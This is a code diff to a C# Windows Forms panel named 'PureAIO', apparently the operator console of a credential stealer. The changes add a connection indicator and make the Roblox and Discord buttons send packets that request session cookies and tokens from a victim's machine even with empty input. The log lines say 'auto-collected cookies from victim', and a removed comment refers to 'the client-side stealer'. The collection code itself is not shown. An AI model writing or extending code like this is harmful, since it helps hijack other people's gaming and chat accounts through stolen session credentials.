@@ -4,6 +4,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using PluginSDK.Interfaces;
 using PluginSDK.Packets;
@@ -16,7 +17,20 @@ namespace PureAIO
         // ── connection ────────────────────────────────────────────────────────
         private Action<IPacket> _send;
 
-        public void SetSend(Action<IPacket> send) => _send = send;
+        public void SetSend(Action<IPacket> send)
+        {
+            _send = send;
+            SetConnected(true);
+        }
+
+        public void SetConnected(bool connected)
+        {
+            if (InvokeRequired) { Invoke(new Action<bool>(SetConnected), connected); return; }
+            lblConnectionStatus.Text      = connected ? "● Connected" : "○ Not connected";
+            lblConnectionStatus.ForeColor = connected
+                ? Color.FromArgb(60, 180, 100)
+                : Color.FromArgb(237, 66, 69);
+        }
 
         public Form1()
         {
@@ -96,20 +110,23 @@ namespace PureAIO
         private void btnRobloxCheck_Click(object sender, EventArgs e)
         {
             var raw = txtRobloxInput.Text.Trim();
-            if (string.IsNullOrEmpty(raw)) return;
 
             lvRoblox.Items.Clear();
-            AppendLog(rtbRobloxLog, $"[*] Checking {CountLines(raw)} cookie(s)…", Color.FromArgb(100, 200, 255));
             lblRobloxStatus.Text = "Checking…";
 
-            // The client-side stealer does its own collection; for manual
-            // single/bulk we re-trigger a request so the client re-runs with
-            // fresh data. The cookies typed here are stored for reference.
-            _pendingRobloxInput = raw.Split(new[] { '\n', '\r' },
-                                            StringSplitOptions.RemoveEmptyEntries)
-                                     .Select(s => s.Trim())
-                                     .Where(s => s.Length > 0)
-                                     .ToList();
+            if (!string.IsNullOrEmpty(raw))
+            {
+                AppendLog(rtbRobloxLog, $"[*] Checking {CountLines(raw)} cookie(s)…", Color.FromArgb(100, 200, 255));
+                _pendingRobloxInput = raw.Split(new[] { '\n', '\r' },
+                                                StringSplitOptions.RemoveEmptyEntries)
+                                         .Select(s => s.Trim())
+                                         .Where(s => s.Length > 0)
+                                         .ToList();
+            }
+            else
+            {
+                AppendLog(rtbRobloxLog, "[*] Re-requesting auto-collected cookies from victim…", Color.FromArgb(100, 200, 255));
+            }
 
             SendPacket(new RobloxCookieRequest());
         }
@@ -191,11 +208,15 @@ namespace PureAIO
         private void btnDiscordCheck_Click(object sender, EventArgs e)
         {
             var raw = txtDiscordInput.Text.Trim();
-            if (string.IsNullOrEmpty(raw)) return;
 
             lvDiscord.Items.Clear();
-            AppendLog(rtbDiscordLog, $"[*] Checking {CountLines(raw)} token(s)…", Color.FromArgb(100, 200, 255));
             lblDiscordStatus.Text = "Checking…";
+
+            if (!string.IsNullOrEmpty(raw))
+                AppendLog(rtbDiscordLog, $"[*] Checking {CountLines(raw)} token(s)…", Color.FromArgb(100, 200, 255));
+            else
+                AppendLog(rtbDiscordLog, "[*] Re-requesting auto-collected tokens from victim…", Color.FromArgb(100, 200, 255));
+
             SendPacket(new DiscordTokenRequest());
         }
 
